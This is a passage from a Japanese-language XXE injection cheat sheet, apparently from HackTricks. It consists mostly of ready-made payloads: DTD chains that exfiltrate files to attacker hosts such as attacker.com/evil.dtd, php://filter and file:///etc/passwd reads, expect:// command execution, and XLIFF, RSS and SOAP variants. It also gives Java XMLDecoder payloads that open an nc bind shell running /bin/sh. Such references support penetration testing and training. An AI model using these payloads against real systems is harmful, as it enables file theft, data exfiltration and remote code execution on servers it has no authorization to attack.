<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTDの例：
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHPラッパー

### Base64

**抽出** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **外部リソースの抽出**
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### リモートコード実行

**PHPの"expect"モジュールがロードされている場合**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

このセクションは [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe) から取られました。\
[Wikipedia](https://en.wikipedia.org/wiki/XLIFF) によると：

> XLIFF（XML Localization Interchange File Format）は、ローカリゼーションプロセス中にツール間でローカライズ可能なデータが渡される方法を標準化し、CATツール交換のための共通フォーマットを作成するために作られた、XMLベースのビテキストフォーマットです。

### Blind request
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
サーバーはエラーで応答します：
```javascript
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
しかし、Burp Collaboratorでヒットを得ました。

### アウトオブバンドを介したデータの流出
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
### エラーを利用したデータの抽出

DTDファイル：
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
サーバーの応答：
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
素晴らしい！`non-exist` ファイルがエラーメッセージに反映されました。次はファイル内容を追加することです。

DTDファイル：
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
And the content of the file was successfully **HTTP経由で送信されたエラーの出力に印刷されました**。

## RSS - XEE

XXE脆弱性を悪用するための有効なRSS形式のXML。

### Ping back

攻撃者サーバーへの単純なHTTPリクエスト
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### ファイルを読む
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### ソースコードの読み取り

PHP base64フィルターを使用して
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEEからRCEへ

XMLDecoderは、XMLメッセージに基づいてオブジェクトを作成するJavaクラスです。悪意のあるユーザーがアプリケーションに任意のデータを**readObject**メソッドの呼び出しに使用させることができれば、サーバー上で即座にコード実行を得ることができます。

### Runtime().exec()の使用
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## ツール

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## その他のリソース

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
独自の外部DTDを使用してHTTP経由で情報を抽出する: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
